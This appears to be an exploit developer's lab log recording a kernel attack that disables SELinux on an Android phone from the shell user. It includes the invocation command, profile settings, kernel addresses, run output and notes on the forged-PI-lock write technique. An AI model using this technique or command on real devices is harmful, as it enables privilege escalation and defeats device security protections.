# CPP20 / 2026-09-25 — W1 (SELinux write) lands on the PJA110 (device)

First time the *current* tree (app-clone, `w1-shift4-resident` + the pipe work)
writes `selinux_state` on the physical device.  Started from `uid=2000(shell)`,
`u:r:shel:s0`, no root, no KSU — nothing on the device was trusted: fresh staging
directory, all artifacts pushed from the host and md5-verified on both sides.

## Result

```
[+] startup context pid=8021 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=859426 attr=u:r:shell:s0 enforce=1
[*] soc: qcom/other; kernel_phys_load=0xa8000000
[*] init_cred image=ffffffc08323f3e8 alias=ffffff802b23f3e8
[*] W1: SELinux target=0xffffff802b3f9990 (8-byte word, byte 2 made odd)
[*] === W1: SELinux === target=0xffffff802b3f9990 mode=1 leaf=0
[*] mcast nonresident: page=0xffffff8855610000 fake_task=0xffffff8855610400 lock=0xffffff802b3aec00 waiter_off=32 task_off=48 lock_off=56 buffer=264
[*] mcast erase words: parent=0xffffff802b3f9988 right=0xffffff8855610100 left=0
[*] [T+10680ms] Write 1 complete
[+] parking after W1: forged PI state kept alive (pid=8021); do NOT exit/kill this process
```

Live state afterwards: `getenforce` → **Permissive**, `/sys/fs/selinux/enforce` → **0**.
No panic: `uptime` is continuous across the run; the machine stays alive but
livelocked (`load average ~10`, the known PI livelock), and the parked process must
not be killed — a reboot is the clean exit.

Command (fresh dir, absolute profile path, no device-side state):

```
cd /data/local/tmp/gl-0925-2136
GHOSTLOCK_HOME=$PWD GHOSTLOCK_W1_ONLY=1 GHOSTLOCK_PARK_AFTER_W1=1 \
GHOSTLOCK_MCAST_SOCKET=tcp6 ./ghostlock --profile /data/local/tmp/gl-0925-2136/profile-mcast.bin
```

`profile-mcast.bin` = `dev-profiles/gl-w1-profile.bin`: route=3 (MulticastWaiter),
`mcast_waiter_off=32`, `buffer_size=264`, `compact_waiter=1`, `w1_attempts=1`,
`kernel_phys_load=0` → falls back to the compiled-in `P0_KERNEL_PHYS_LOAD=0xa8000000`.

## What did not work, and why it matters

* **Route matters more than the carrier "winning".** With the historically proven
  TCP-zerocopy profile (route=1, `dev-profiles/tcp-profile.bin`) the carrier primed
  exactly like the 2026-09-20 success —

  ```
  [*] tcp route enter page=ffffff8906b78000 fake_lock=...e80 fake_w0=...180 fake_task=...800 attempts=2000 arm=16 hold=20000
  [*] tcp route won seq=16 calls=1 success=1 ret=0
  [*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
  ```

  — but the store never happened (`[-] Write 1 failed`, `step=0`, SELinux stayed
  Enforcing).  The mcast path stamps the erase geometry
  (`mcast erase words: parent=<target-8> right=<sprayed page> left=0`) before the
  walk; the TCP-zerocopy path does not, so the inlined `rb_erase` relink has no
  write shape to use.  Porting the erase-word stamping to that route is the obvious
  next step if it is to be used again.

* **`--profile` must be an absolute path.**  `--profile ./profile.bin` fails with
  `cannot load resolved profile` even though the file is valid GLK1 (742 B,
  `GLK1`/ver=2/release 42) and readable by the same uid; the loader opens the string
  as-is, and the runtime rewrites `HOME`, so any relative path depends on state the
  exploit itself changes.  The failure message now prints `errno`/`strerror` — the
  two causes (cannot open vs layout did not validate) were previously
  indistinguishable.

* **`/data/local/tmp` on this phone is full of stale artifacts** (`.ghostlock_root.sh`,
  `active-profile.bin`, `.ghostlock_iomem`, `kread_min.ko`, …).  Nothing here used
  them: fresh `gl-<stamp>` directory, `GHOSTLOCK_HOME` pointed at it, artifacts
  pushed with `md5sum` compared host-vs-device (`95bae9…` binary, `93b170…` profile,
  `8b0ed6…` mcast profile).
